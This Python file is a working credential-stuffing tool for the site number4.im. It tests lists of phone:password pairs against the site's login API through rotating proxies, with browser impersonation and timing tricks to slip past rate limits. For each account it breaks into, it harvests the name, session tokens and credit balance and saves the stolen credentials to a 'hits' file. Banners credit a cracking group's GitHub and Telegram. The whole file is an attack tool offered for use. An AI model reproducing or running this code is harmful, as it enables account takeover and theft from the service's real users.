import sys, os, re, time, json, random, threading, base64, urllib.parse
from queue import Queue, Empty
from concurrent.futures import ThreadPoolExecutor

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("pip install curl_cffi")
    sys.exit(1)


UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/154.0.0.0 Safari/537.36")

BASE_HOST    = "https://number4.im"
LOGIN_URL    = BASE_HOST + "/api/login"
CHKNEWBUY_URL = BASE_HOST + "/api/chknewbuy"

PROXY_TEST_URLS      = [
    "https://api.ipify.org?format=json",
    "https://httpbin.org/ip",
]
PROXY_TEST_TIMEOUT   = 12
PROXY_TEST_THREADS   = 40

PER_PROXY_MAX_USES   = 5
PER_PROXY_WINDOW     = 60
RATE_LIMIT_COOLDOWN  = 180
MAX_RETRIES_PER_ITEM = 3
BASE_BACKOFF         = 30
MAX_BACKOFF          = 300
JITTER_MIN           = 1.0
JITTER_MAX           = 3.0
CHECK_THREADS        = 10

RL_BACKOFF_BASE      = 20
RL_BACKOFF_MAX       = 240
RL_MAX_RETRIES       = 4
SECOND_PASS_DELAY    = 90

OUT_TXT_DEFAULT      = "number4_hits.txt"
PROXY_LIVE_SUFFIX    = "_live.txt"

# message markers (from the live site response)
MSG_SUCCESS_MARKERS  = ["ورود موفق", "موفقیت آمیز", "login successful"]
MSG_ACTIVATE_MARKERS = ["فعال سازی", "فعال‌سازی", "activate", "کد فعال"]
MSG_FAIL_MARKERS     = [
    "رمز عبور", "صحیح نیست", "incorrect",
    "یافت نشد", "not found", "نام کاربری",
    "اشتباه", "invalid",
]
RATE_MARKERS         = ["بیش از حد مجاز", "too many", "rate limit", "تلاش"]


class C:
    R  = "\033[0m";  B  = "\033[1m";  D  = "\033[90m"
    CY = "\033[96m"; GR = "\033[92m"; YE = "\033[93m"
    RE = "\033[91m"; MA = "\033[95m"; WH = "\033[97m"


def tty():
    try:
        return sys.stdout.isatty()
    except Exception:
        return False


USE_COLOR = tty()


def col(code, s):
    return (code + s + C.R) if USE_COLOR else s


def clear_line():
    sys.stdout.write("\r\033[K" if USE_COLOR else "\r")


def bar(cur, total, width=22):
    if total <= 0:
        return "[" + (" " * width) + "]"
    filled = max(0, min(width, int(width * cur / total)))
    return "[%s%s]" % ("█" * filled, "░" * (width - filled))


BASE_HEADERS = {
    "User-Agent":         UA,
    "Accept":             "application/json, text/javascript, */*; q=0.01",
    "Accept-Language":    "en-GB,en;q=0.9,fa-IR;q=0.8,fa;q=0.7",
    "Accept-Encoding":    "gzip, deflate, br, zstd",
    "Origin":             BASE_HOST,
    "Referer":            BASE_HOST + "/",
    "Sec-Fetch-Site":     "same-origin",
    "Sec-Fetch-Mode":     "cors",
    "Sec-Fetch-Dest":     "empty",
    "Sec-Ch-Ua":          '"Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"',
    "Sec-Ch-Ua-Mobile":   "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Priority":           "u=1, i",
    "Connection":         "keep-alive",
    "X-Requested-With":   "XMLHttpRequest",
}

HOME_HEADERS = dict(BASE_HEADERS)
HOME_HEADERS["Accept"] = ("text/html,application/xhtml+xml,application/xml;"
                          "q=0.9,image/avif,image/webp,*/*;q=0.8")
HOME_HEADERS["Sec-Fetch-Dest"] = "document"
HOME_HEADERS["Sec-Fetch-Mode"] = "navigate"
HOME_HEADERS["Sec-Fetch-Site"] = "same-origin"
HOME_HEADERS["Upgrade-Insecure-Requests"] = "1"


hits_lock    = threading.Lock()
counter_lock = threading.Lock()
print_lock   = threading.Lock()
proxy_lock   = threading.Lock()

counters = {
    "checked": 0, "hits": 0, "fails": 0,
    "errors": 0, "retries": 0, "ratelimit": 0, "activate": 0,
}
hits_file     = None
proxy_state   = {}
proxy_penalty = {}

hits_records = []
hits_meta    = {"proxies": 0, "total": 0}


def normalize_proxy(raw):
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None

    if re.match(r'^(https?|socks5h?|socks4a?)://', raw):
        m = re.match(
            r'^(?P<scheme>https?|socks5h?|socks4a?)://'
            r'(?P<host>[^:/@]+):(?P<port>\d+)'
            r':(?P<user>[^:@]+):(?P<pw>.+)$',
            raw,
        )
        if m:
            return "%s://%s:%s@%s:%s" % (
                m.group("scheme"), m.group("user"),
                m.group("pw"),     m.group("host"),
                m.group("port"),
            )
        return raw

    m = re.match(
        r'^(?P<host>[^:/@]+):(?P<port>\d+)'
        r':(?P<user>[^:@]+):(?P<pw>.+)$',
        raw,
    )
    if m:
        return "http://%s:%s@%s:%s" % (
            m.group("user"), m.group("pw"),
            m.group("host"), m.group("port"),
        )

    m = re.match(r'^(?P<host>[^:/@]+):(?P<port>\d+)$', raw)
    if m:
        return "http://%s:%s" % (m.group("host"), m.group("port"))

    if "@" in raw and "://" not in raw:
        return "http://" + raw

    return None


def load_proxies(path):
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = normalize_proxy(ln)
            if p:
                out.append(p)
    return out


def test_proxy(proxy):
    proxies = {"http": proxy, "https": proxy}
    last_err = ""
    for url in PROXY_TEST_URLS:
        t0 = time.time()
        try:
            r = cffi_requests.get(
                url,
                proxies=proxies,
                impersonate="chrome146",
                timeout=PROXY_TEST_TIMEOUT,
                headers={"User-Agent": UA, "Accept": "application/json, */*"},
            )
            dt = time.time() - t0
            if r.status_code != 200:
                last_err = "http %d" % r.status_code
                continue
            try:
                j  = r.json()
                ip = j.get("ip", "") or j.get("origin", "")
            except Exception:
                ip = (r.text or "").strip()[:64]
            return {"proxy": proxy, "ok": True,
                    "latency": round(dt, 2), "ip": ip}
        except Exception as e:
            last_err = str(e)[:80]
            continue
    return {"proxy": proxy, "ok": False, "err": last_err}


def run_proxy_test(plist, threads=PROXY_TEST_THREADS):
    if not plist:
        return []
    total = len(plist)

    print()
    print(col(C.CY + C.B, "  ── step 1 · proxy check ─────────────────────────────────────"))
    print(col(C.D, "    %d proxies  ·  %d threads" % (total, threads)))
    print()

    q = Queue()
    for p in plist:
        q.put(p)

    live      = []
    dead      = 0
    done      = 0
    live_lock = threading.Lock()

    def worker():
        nonlocal dead, done
        while True:
            try:
                p = q.get(timeout=2)
            except Empty:
                return
            res = test_proxy(p)
            with live_lock:
                done += 1
                if res.get("ok"):
                    live.append(res)
                    tag = col(C.GR, "  ✓  ")
                    sys.stdout.write(
                        "\r\033[K%s%-52s  %5.2fs  ip=%s\n"
                        % (tag, p[:52], res["latency"],
                           res.get("ip", "")[:20])
                    )
                else:
                    dead += 1
                    tag = col(C.RE, "  ✗  ")
                    sys.stdout.write(
                        "\r\033[K%s%-52s  %s\n"
                        % (tag, p[:52], res.get("err", "")[:36])
                    )
            with print_lock:
                clear_line()
                sys.stdout.write(
                    "     %s  done %d/%d  live %s  dead %s"
                    % (col(C.CY, bar(done, total)),
                       done, total,
                       col(C.GR, str(len(live))),
                       col(C.RE, str(dead)))
                )
                sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker) for _ in range(threads)]
        for f in futs:
            f.result()

    print()
    print()
    live.sort(key=lambda r: r["latency"])
    return live


def proxy_ready(p):
    now = time.time()
    if proxy_penalty.get(p, 0) > now:
        return False
    rec = proxy_state.get(p)
    if rec is None:
        return True
    start, count = rec
    if now - start > PER_PROXY_WINDOW:
        return True
    return count < PER_PROXY_MAX_USES


def consume_proxy(p):
    now = time.time()
    with proxy_lock:
        rec = proxy_state.get(p)
        if rec is None or now - rec[0] > PER_PROXY_WINDOW:
            proxy_state[p] = [now, 1]
        else:
            proxy_state[p][1] += 1


def penalize_proxy(p, seconds=RATE_LIMIT_COOLDOWN):
    with proxy_lock:
        proxy_penalty[p] = time.time() + seconds


def pick_proxy(proxies, timeout=90):
    if not proxies:
        return None
    t0 = time.time()
    while time.time() - t0 < timeout:
        avail = [p for p in proxies if proxy_ready(p)]
        if avail:
            p = random.choice(avail)
            consume_proxy(p)
            return p
        time.sleep(0.5)
    best = min(proxies, key=lambda x: proxy_penalty.get(x, 0))
    consume_proxy(best)
    return best


def _requeue_later(q, user, pw, attempts, delay):
    time.sleep(delay)
    q.put((user, pw, attempts + 1))


def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(tok):
    try:
        parts = tok.split(".")
        if len(parts) != 3:
            return {}, {}
        return json.loads(b64d(parts[0])), json.loads(b64d(parts[1]))
    except Exception:
        return {}, {}


def extract_tokens(resp):
    """Extract access_token / refresh_token / sid — number4 may or may not use JWT."""
    out = {"access": "", "refresh": "", "sid": ""}
    try:
        j = resp.json()
        out["access"]  = j.get("access_token", "") or ""
        out["refresh"] = j.get("refresh_token", "") or ""
    except Exception:
        m = re.search(r'"access_token"\s*:\s*"([^"]+)"', resp.text)
        if m:
            out["access"] = m.group(1)
        m = re.search(r'"refresh_token"\s*:\s*"([^"]+)"', resp.text)
        if m:
            out["refresh"] = m.group(1)

    try:
        for c in resp.cookies:
            if c.name == "sid":
                out["sid"] = c.value
                break
    except Exception:
        pass
    if not out["sid"]:
        m = re.search(r"sid=([0-9a-f\-]+)",
                      resp.headers.get("Set-Cookie", "") or "")
        if m:
            out["sid"] = m.group(1)
    return out


def build_intel(tokens):
    _, ap = decode_jwt(tokens.get("access", ""))
    ap = ap or {}
    return {
        "name":  ap.get("name", "") or "",
        "phone": ap.get("phone_number", "") or ap.get("phone", "") or "",
        "sub":   ap.get("sub", None),
        "sid":   tokens.get("sid", "") or "",
    }


def try_login(phone, password, proxy=None):

    proxies  = {"http": proxy, "https": proxy} if proxy else None
    captured = {}
    tokens   = {"access": "", "refresh": "", "sid": ""}
    intel    = {}

    try:
        sess = cffi_requests.Session(impersonate="chrome146")
        if proxies:
            sess.proxies.update(proxies)

        # warm up — grab csrf-token + session cookies
        try:
            sess.get(BASE_HOST + "/", headers=HOME_HEADERS, timeout=20,
                     allow_redirects=True)
        except Exception:
            pass

        params = {"email": phone, "password": password}
        r = sess.get(
            LOGIN_URL,
            params=params,
            headers=BASE_HEADERS,
            timeout=25,
            allow_redirects=True,
        )

        body = r.text or ""
        low  = body.lower()

    
        rl_remaining = r.headers.get("x-ratelimit-remaining")
        rl_limit     = r.headers.get("x-ratelimit-limit")
        try:
            if rl_remaining is not None and int(rl_remaining) <= 0:
                return "RATE_LIMIT", "rl=0", {}, {}, {}
        except Exception:
            pass

        if any(m in body for m in RATE_MARKERS) or \
           "too many" in low or "rate limit" in low:
            return "RATE_LIMIT", "rl marker", {}, {}, {}

        if any(m in body for m in MSG_ACTIVATE_MARKERS):
            return "ACTIVATE", "needs activation", {}, {}, {}

        
        code = None
        msg  = ""
        try:
            j    = r.json()
            code = str(j.get("code", "")).strip()
            msg  = (j.get("data", {}) or {}).get("msg", "") or ""
        except Exception:
            m = re.search(r'"code"\s*:\s*"?([0-9]+)"?', body)
            if m:
                code = m.group(1)
            m = re.search(r'"msg"\s*:\s*"([^"]+)"', body)
            if m:
                msg = m.group(1)

        msg_low = (msg or "").lower()

        
        if code == "200":
            tokens = extract_tokens(r)
            intel  = build_intel(tokens)
            # try balance
            try:
                h_bal = dict(BASE_HEADERS)
                if tokens["access"]:
                    h_bal["Authorization"] = "Bearer " + tokens["access"]
                rb = sess.get(CHKNEWBUY_URL,
                              params={"view": 1,
                                      "token": "".join(
                                          random.choices(
                                              "abcdefghijklmnopqrstuvwxyz0123456789",
                                              k=29))},
                              headers=h_bal, timeout=20)
                try:
                    jb = rb.json()
                    if isinstance(jb, dict):
                        data = jb.get("data", {}) or {}
                        if data.get("credit"):
                            captured["balance"] = str(data["credit"])
                except Exception:
                    pass
            except Exception:
                pass
            return "HIT", msg, captured, tokens, intel

        if code == "400":
            return "ACTIVATE", msg or "400", {}, {}, {}

        if code == "404":
            return "FAIL", msg or "404", {}, {}, {}

        if r.status_code in (400, 401, 403):
            return "FAIL", "http %d" % r.status_code, {}, {}, {}

        # fallback — marker scan
        if any(m in body for m in MSG_SUCCESS_MARKERS):
            tokens = extract_tokens(r)
            intel  = build_intel(tokens)
            return "HIT", msg, captured, tokens, intel

        if any(m in body for m in MSG_FAIL_MARKERS):
            return "FAIL", msg, {}, {}, {}

        if r.status_code == 200:
            return "FAIL", "unknown 200", {}, {}, {}

        return "ERROR", "http %d" % r.status_code, {}, {}, {}

    except Exception as e:
        err = str(e)[:100]
        if "proxy" in err.lower() or "connect" in err.lower():
            return "ERROR", "proxy: " + err, {}, {}, {}
        return "ERROR", err, {}, {}, {}


def _write_hits_file(path):
    total  = len(hits_records)
    ts_hdr = time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime())
    W      = 68
    line   = "═" * W

    header = [
        " number4.im Hits  ·  zal checker",
        " github.com/professorzal  ·  t.me/professor_zal_projects",
        " generated %s" % ts_hdr,
        " %d hits  ·  %d checked  ·  %d proxies"
        % (total, counters["checked"], hits_meta.get("proxies", 0)),
    ]

    with open(path, "w", encoding="utf-8") as f:
        f.write(line + "\n")
        for h in header:
            f.write(h.ljust(W) + "\n")
        f.write(line + "\n")

        for i, r in enumerate(hits_records, 1):
            f.write("\n")
            f.write(" [%d]  %s\n" % (i, r["ts"]))
            f.write("      %-8s : %s\n" % ("phone",   r["phone"]   or ""))
            f.write("      %-8s : %s\n" % ("pass",    r["pass"]    or ""))
            f.write("      %-8s : %s\n" % ("name",    r["name"]    or ""))
            f.write("      %-8s : %s\n" % ("balance", r["balance"] or "0"))


def record_hit(path, name, phone, password, balance):
    rec = {
        "ts":      time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "name":    (name     or "").replace("\n", " ").strip(),
        "phone":   (phone    or "").replace("\n", " ").strip(),
        "pass":    (password or "").replace("\n", " ").strip(),
        "balance": (balance  or "").replace("\n", " ").strip(),
    }
    with hits_lock:
        hits_records.append(rec)
        _write_hits_file(path)


def render_hit_block(idx, name, phone, password, balance):
    W = 62

    def row(k, v, colr=None):
        val = v if v else col(C.D, "—")
        if colr and v:
            val = col(colr, val)
        return "  │  %-9s %s" % (col(C.B, k + ":"), val)

    top = (col(C.GR, "  ┌─ HIT #%d " % idx)
           + col(C.GR, "─" * max(0, W - 12 - len(str(idx))))
           + col(C.GR, "┐"))
    bot = col(C.GR, "  └" + "─" * W + "┘")
    out = [top]
    out.append(row("phone",   phone,   C.CY))
    out.append(row("pass",    password, C.YE))
    out.append(row("name",    name,    C.WH))
    out.append(row("balance", balance, C.GR))
    out.append(bot)
    return "\n".join(out)


def render_summary(data):
    W     = 46
    plain = []
    for k, v in data:
        plain.append("  │  %-14s : %s" % (k, v))
    top = "  ╭─ summary " + "─" * (W - 11) + "╮"
    bot = "  ╰" + "─" * W + "╯"
    return "\n".join([top] + plain + [bot])


def run_combo_check(combos, proxies, out_path, threads=CHECK_THREADS):
    global hits_file, hits_records
    hits_file    = out_path
    hits_records = []
    _write_hits_file(hits_file)

    total = len(combos)
    print()
    print(col(C.CY + C.B, "  ── step 2 · combo check ─────────────────────────────────────"))
    print(col(C.D, "    %d combos  ·  %d threads  ·  %d proxies"
                   % (total, threads, len(proxies))))
    print()

    retry_queue = Queue()
    second_pass = []
    stop_event  = threading.Event()
    for u, p in combos:
        retry_queue.put((u, p, 0))

    t0 = time.time()

    def draw_progress(c):
        with print_lock:
            rl = counters["ratelimit"]
            er = counters["errors"]
            hi = counters["hits"]
            fa = counters["fails"]
            ac = counters["activate"]
            clear_line()
            sys.stdout.write(
                "     %s  %d/%d  ·  hits %s  ·  fails %s  ·  act %s  ·  rl %s  ·  err %s"
                % (col(C.CY, bar(c, total)),
                   c, total,
                   col(C.GR, str(hi)),
                   col(C.RE, str(fa)),
                   col(C.YE, str(ac)),
                   col(C.YE, str(rl)),
                   col(C.D,  str(er)))
            )
            sys.stdout.flush()

    def worker():
        while True:
            if stop_event.is_set():
                return
            try:
                item = retry_queue.get(timeout=3)
            except Empty:
                return
            phone, password, attempts = item

            proxy = pick_proxy(proxies) if proxies else None
            status, note, captured, tokens, intel = try_login(phone, password, proxy)

            with counter_lock:
                counters["checked"] += 1
                c = counters["checked"]

            if status == "HIT":
                with counter_lock:
                    counters["hits"] += 1
                    hit_idx = counters["hits"]
                name    = (intel.get("name", "") or "")
                _phone  = (intel.get("phone", "") or phone)
                balance = captured.get("balance", "") or ""
                record_hit(hits_file, name, _phone, password, balance)
                with print_lock:
                    clear_line()
                    sys.stdout.write("\n")
                    sys.stdout.write(
                        render_hit_block(hit_idx, name, _phone, password, balance) + "\n"
                    )
                    sys.stdout.flush()

            elif status == "ACTIVATE":
                with counter_lock:
                    counters["activate"] += 1

            elif status == "RATE_LIMIT":
                with counter_lock:
                    counters["ratelimit"] += 1
                if proxy:
                    penalize_proxy(proxy, RATE_LIMIT_COOLDOWN)

                if attempts < RL_MAX_RETRIES:
                    backoff = min(RL_BACKOFF_BASE * (2 ** attempts), RL_BACKOFF_MAX)
                    delay   = backoff + random.uniform(0, 5)
                    threading.Thread(
                        target=lambda u=phone, p=password, a=attempts, d=delay:
                            _requeue_later(retry_queue, u, p, a, d),
                        daemon=True,
                    ).start()
                else:
                    with counter_lock:
                        second_pass.append((phone, password))

            elif status == "FAIL":
                with counter_lock:
                    counters["fails"] += 1

            else:
                with counter_lock:
                    counters["errors"] += 1

            draw_progress(c)
            time.sleep(random.uniform(JITTER_MIN, JITTER_MAX))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker) for _ in range(threads)]
        try:
            for f in futs:
                f.result()
        except KeyboardInterrupt:
            print("\n" + col(C.YE, "  [!] Ctrl+C — stopping main pass"))
            stop_event.set()

    print()
    print()

    if second_pass:
        run_second_pass(second_pass, proxies, out_path,
                        threads=max(3, threads // 2))

    dt = time.time() - t0

    print(col(C.CY + C.B, "  ── done ────────────────────────────────────────────────────"))
    print()
    print(render_summary([
        ("elapsed",    "%.1fs" % dt),
        ("checked",    str(counters["checked"])),
        ("hits",       col(C.GR, str(counters["hits"]))),
        ("activate",   str(counters["activate"])),
        ("fails",      str(counters["fails"])),
        ("rate-limit", str(counters["ratelimit"])),
        ("errors",     str(counters["errors"])),
        ("hits file",  hits_file),
    ]))
    print()


def run_second_pass(combos, proxies, out_path, threads):
    print(col(C.CY + C.B,
              "  ── step 3 · second pass (rate-limited) ──────────────────────"))
    print(col(C.D, "    %d items  ·  waiting %ds for cooldowns"
                   % (len(combos), SECOND_PASS_DELAY)))
    time.sleep(SECOND_PASS_DELAY)
    print(col(C.D, "    resuming…"))
    print()

    q = Queue()
    for u, p in combos:
        q.put((u, p, 0))

    stop_event = threading.Event()

    def worker():
        while True:
            if stop_event.is_set():
                return
            try:
                item = q.get(timeout=3)
            except Empty:
                return
            phone, password, attempts = item

            proxy = pick_proxy(proxies) if proxies else None
            status, note, captured, tokens, intel = try_login(phone, password, proxy)

            with counter_lock:
                counters["checked"] += 1
                c = counters["checked"]

            if status == "HIT":
                with counter_lock:
                    counters["hits"] += 1
                    hit_idx = counters["hits"]
                name    = (intel.get("name", "") or "")
                _phone  = (intel.get("phone", "") or phone)
                balance = captured.get("balance", "") or ""
                record_hit(out_path, name, _phone, password, balance)
                with print_lock:
                    clear_line()
                    sys.stdout.write("\n")
                    sys.stdout.write(
                        render_hit_block(hit_idx, name, _phone, password, balance) + "\n"
                    )
                    sys.stdout.flush()

            elif status == "ACTIVATE":
                with counter_lock:
                    counters["activate"] += 1

            elif status == "RATE_LIMIT":
                with counter_lock:
                    counters["ratelimit"] += 1
                if proxy:
                    penalize_proxy(proxy, RATE_LIMIT_COOLDOWN)
                if attempts < 3:
                    backoff = 30 * (attempts + 1) + random.uniform(0, 10)
                    threading.Thread(
                        target=lambda u=phone, p=password, a=attempts, d=backoff:
                            _requeue_later(q, u, p, a, d),
                        daemon=True,
                    ).start()

            elif status == "FAIL":
                with counter_lock:
                    counters["fails"] += 1

            else:
                with counter_lock:
                    counters["errors"] += 1

            with print_lock:
                clear_line()
                sys.stdout.write(
                    "     %s  2nd-pass  checked %d  ·  hits %s  ·  act %s  ·  rl %s"
                    % (col(C.CY, bar(counters["checked"],
                                    hits_meta["total"] or 1)),
                       counters["checked"],
                       col(C.GR, str(counters["hits"])),
                       col(C.YE, str(counters["activate"])),
                       col(C.YE, str(counters["ratelimit"])))
                )
                sys.stdout.flush()

            time.sleep(random.uniform(JITTER_MIN, JITTER_MAX))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker) for _ in range(threads)]
        try:
            for f in futs:
                f.result()
        except KeyboardInterrupt:
            print("\n" + col(C.YE, "  [!] Ctrl+C — stopping second pass"))
            stop_event.set()
    print()
    print()


def ask(prompt, default=None):
    suffix = (" [%s]" % default) if default else ""
    try:
        val = input(col(C.B, "  ? ") + prompt + col(C.D, suffix) + " : ").strip()
    except EOFError:
        return default
    if not val and default is not None:
        return default
    return val


def ask_int(prompt, default):
    v = ask(prompt, str(default))
    try:
        return int(v)
    except Exception:
        return default


def ask_yes(prompt, default="y"):
    v = ask(prompt + " (y/n)", default).lower()
    return v.startswith("y")


def banner():
    W     = 60
    line1 = "  number4.im  ·  phone:pass combo checker"
    line2 = "  github.com/professorzal  ·  @mr_crkz"
    line3 = "  https://t.me/professor_zal_projects"
    print()
    print(col(C.MA + C.B, "  ╔" + "═" * W + "╗"))
    print(col(C.MA + C.B, "  ║" + line1.center(W) + "║"))
    print(col(C.MA + C.B, "  ║" + line2.center(W) + "║"))
    print(col(C.MA + C.B, "  ║" + line3.center(W) + "║"))
    print(col(C.MA + C.B, "  ╚" + "═" * W + "╝"))
    print()


def main():
    banner()

    use_proxies  = ask_yes("Use proxies?", "y")
    live_proxies = []

    if use_proxies:
        pfile = ask("Proxy file path", "proxies.txt")
        if not os.path.exists(pfile):
            print(col(C.RE, "  [!] not found: %s" % pfile))
            return 1
        raw = load_proxies(pfile)
        print(col(C.D, "  ·  loaded %d proxies" % len(raw)))

        threads_t = ask_int("Test threads", PROXY_TEST_THREADS)
        live_res  = run_proxy_test(raw, threads=threads_t)
        live_proxies = [r["proxy"] for r in live_res]

        out_live = os.path.splitext(pfile)[0] + PROXY_LIVE_SUFFIX
        with open(out_live, "w", encoding="utf-8") as f:
            for p in live_proxies:
                f.write(p + "\n")

        if live_proxies:
            print(col(C.GR, "  ✓ live proxies: %d" % len(live_proxies))
                  + col(C.D, "  →  " + out_live))
        else:
            print(col(C.RE, "  ✗ no live proxies — abort"))
            return 1

    cfile = ask("Combo file path", "combo.txt")
    if not os.path.exists(cfile):
        print(col(C.RE, "  [!] not found: %s" % cfile))
        return 1

    combos = []
    with open(cfile, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            ln = ln.strip()
            if not ln or ln.startswith("#"):
                continue
            for sep in (":", "|", ";"):
                if sep in ln:
                    u, p = ln.split(sep, 1)
                    combos.append((u.strip(), p.strip()))
                    break
    if not combos:
        print(col(C.RE, "  [!] no combos"))
        return 1
    print(col(C.D, "  ·  loaded %d combos" % len(combos)))

    out_txt   = ask("Output txt path", OUT_TXT_DEFAULT)
    threads_c = ask_int("Check threads", CHECK_THREADS)

    hits_meta["proxies"] = len(live_proxies)
    hits_meta["total"]   = len(combos)

    run_combo_check(combos, live_proxies, out_txt, threads=threads_c)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n" + col(C.YE, "  [!] aborted by user"))
        sys.exit(130)